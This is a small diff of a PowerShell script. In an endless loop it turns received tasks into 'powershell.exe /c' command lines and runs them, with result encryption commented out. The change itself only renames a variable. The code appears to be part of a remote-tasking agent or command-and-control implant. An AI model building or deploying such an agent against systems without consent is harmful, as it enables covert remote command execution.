@@ -54,12 +54,12 @@ for (;;){
     $task = $task.split()  # task=['VALID','shell','dir']
 
     
-        $args    = $task[0..$task.Length]
+        $arguments   = $task[0..$task.Length]
     
         $f    = "powershell.exe"
         $arg  = "/c "
     
-        foreach ($a in $args){ $arg += $a + " " }
+        foreach ($a in $arguments){ $arg += $a + " " }
 
         $res  = shell $f $arg
         # $res  = Encrypt $key $res
